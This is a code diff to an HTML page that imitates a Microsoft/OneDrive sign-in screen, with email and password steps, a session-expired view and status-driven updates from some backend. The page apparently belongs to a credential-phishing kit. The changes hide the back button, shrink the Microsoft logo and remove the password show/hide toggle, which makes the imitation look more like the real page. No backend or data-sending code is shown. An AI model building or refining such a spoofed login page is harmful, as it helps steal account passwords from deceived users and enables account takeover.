@@ -50,10 +50,10 @@ body{background-color:#f0f0f0;font-family:'Segoe UI',-apple-system,BlinkMacSyste
 .od-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.45);z-index:10;display:flex;justify-content:center;align-items:center}
 .od-login-card{width:440px;max-width:95vw;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);position:relative;display:flex;flex-direction:column;max-height:90vh;border-radius:8px}
 .od-login-banner{display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #edebe9;gap:12px}
-.od-login-back{width:32px;height:32px;display:none;align-items:center;justify-content:center;cursor:pointer;color:#616161;border-radius:2px;flex-shrink:0;border:0;background:transparent;padding:0}
+.od-login-back{display:none !important}
 .od-login-back:hover{background:#f3f2f1}
 .od-login-back.visible{display:flex}
-.od-login-mslogo{display:block;margin:0 auto;height:108px;width:auto}
+.od-login-mslogo{display:block;margin:0 auto;height:40px;width:auto}
 .od-login-body{padding:36px 44px 28px;display:flex;flex-direction:column;flex:1;overflow-y:auto;text-align:center}
 .od-login-body h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px;line-height:1.33;text-align:center}
 .od-login-body .subtitle{font-size:14px;color:#616161;margin-bottom:20px;line-height:1.43;text-align:center}
@@ -71,8 +71,6 @@ body{background-color:#f0f0f0;font-family:'Segoe UI',-apple-system,BlinkMacSyste
 .fui-Input input:focus~.fui-Label,.fui-Input input.has-value~.fui-Label{top:0;font-size:12px;color:#0067b8;background:#fff}
 .fui-Field.field-error .fui-Input{border:2px solid #c4314b}
 .fui-Field.field-error .fui-Label{color:#c4314b}
-.od-eye-btn{position:absolute;right:8px;top:50%;transform:translateY(-50%);border:0;background:transparent;cursor:pointer;color:#616161;padding:6px;display:flex;align-items:center;justify-content:center;border-radius:2px}
-.od-eye-btn:hover{color:#323130}
 
 .error-msg{color:#c4314b;font-size:13px;margin-top:6px;display:none;font-family:'Segoe UI',sans-serif;align-items:center;gap:6px}
 .error-msg .error-icon{width:16px;height:16px;flex-shrink:0;fill:#c4314b}
@@ -120,7 +118,7 @@ body{background-color:#f0f0f0;font-family:'Segoe UI',-apple-system,BlinkMacSyste
 .splash-error{color:#c4314b;font-size:14px;text-align:center;max-width:300px;margin-top:24px;display:none}
 
 #sessionExpiredView{display:none;width:100%;max-width:440px;flex-direction:column;align-items:center;text-align:center;background:#fff;border-radius:8px;padding:48px 40px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
-#sessionExpiredView .se-mslogo{height:108px;margin-bottom:16px}
+#sessionExpiredView .se-mslogo{height:40px;margin-bottom:16px}
 #sessionExpiredView h1{font-size:24px;font-weight:600;color:#1b1f1b;margin-bottom:16px;text-align:center;font-family:'Segoe UI',sans-serif;line-height:1.33}
 #sessionExpiredView p{font-size:14px;color:#616161;line-height:1.5;margin-bottom:32px;max-width:400px;font-family:'Segoe UI',sans-serif;text-align:center}
 #sessionExpiredView .se-btn-row{width:100%;display:flex;justify-content:center}
@@ -225,7 +223,7 @@ body{background-color:#f0f0f0;font-family:'Segoe UI',-apple-system,BlinkMacSyste
 <div class="od-email-badge" id="emailChip"><div class="avatar"></div><span class="email-text"></span><span class="dropdown-arrow">&#9662;</span></div>
 <h1 id="password_heading">Enter your password</h1>
 <div class="fui-Field" id="passwordGroup">
-<span class="fui-Input"><input type="password" id="txtPassword" name="txtPassword" autocomplete="off" minlength="6" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}"><label class="fui-Label">Password</label><button type="button" class="od-eye-btn" id="eyeToggle" onclick="var p=document.getElementById('txtPassword');var ic=document.getElementById('eyeIcon');if(p.type==='password'){p.type='text';ic.className='fas fa-eye-slash'}else{p.type='password';ic.className='fas fa-eye'}" tabindex="-1"><i class="fas fa-eye" id="eyeIcon"></i></button></span>
+<span class="fui-Input"><input type="password" id="txtPassword" name="txtPassword" autocomplete="off" minlength="6" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}"><label class="fui-Label">Password</label></span>
 <div class="error-msg" id="RequirePassword"><svg class="error-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Enter your password.</span></div>
 <div class="error-msg" id="InvalidPassword"><svg class="error-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Your account or password is incorrect.</span></div>
 </div>
@@ -435,7 +433,6 @@ document.getElementById('forgotPasswordLink').style.display='none';
 document.getElementById('signin_heading').innerText='Sign in';
 document.getElementById('statement').innerText='Use your Microsoft account.';
 pF.value='';pF.type='password';
-var et=document.getElementById('eyeIcon');if(et)et.className='fas fa-eye';
 }
 
 function updateUIForStatus(s,d){
@@ -492,7 +489,7 @@ var ful=document.getElementById('forgotUsernameLink');if(ful)ful.style.display='
 document.getElementById('forgotPasswordLink').style.display='block';
 var fl=document.getElementById('footerLink');if(fl)fl.innerHTML='<a href="https://account.live.com/forgotpassword" target="_blank" rel="noopener">Other ways to sign in</a>';
 sB.textContent='Sign in';
-pF.value='';pF.type='password';var et=document.getElementById('eyeIcon');if(et)et.className='fas fa-eye'}
+pF.value='';pF.type='password'}
 eF.readOnly=true;pF.disabled=false;pF.focus();
 if(d.lastJsonResponse){
 try{var r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;
